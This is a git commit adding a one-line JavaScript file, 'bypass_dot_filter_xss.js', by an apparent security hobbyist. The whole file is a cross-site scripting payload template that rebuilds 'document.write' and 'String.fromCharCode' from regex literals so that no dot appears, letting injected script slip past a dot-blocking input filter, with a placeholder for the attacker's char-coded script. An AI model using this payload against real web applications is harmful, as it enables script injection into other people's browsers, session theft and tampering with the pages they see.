076fc9760a647e537f868cd6f0c18119bbc4723f
darthann <younes.ijichi@gmail.com>
2019-07-15 14:59:23 -0400

    Create bypass_dot_filter_xss.js

---
+++ bypass_dot_filter_xss.js
@@ -0,0 +1,1 @@
+function write(str){ var s = /write/; var w = String(); var n = String(); w += s; w += s; n += w[1] + w[2] + w[3] + w[4] + w[5]; document[n](str); } var s = /fromCharCode/; var w = String(); var n = String(); w += s; n += w[1] + w[2] + w[3] + w[4] + w[5] + w[6] + w[7] + w[8] + w[9] + w[10] + w[11] + w[12]; write(String[n](/*PUT CHARCODE HERE*/));
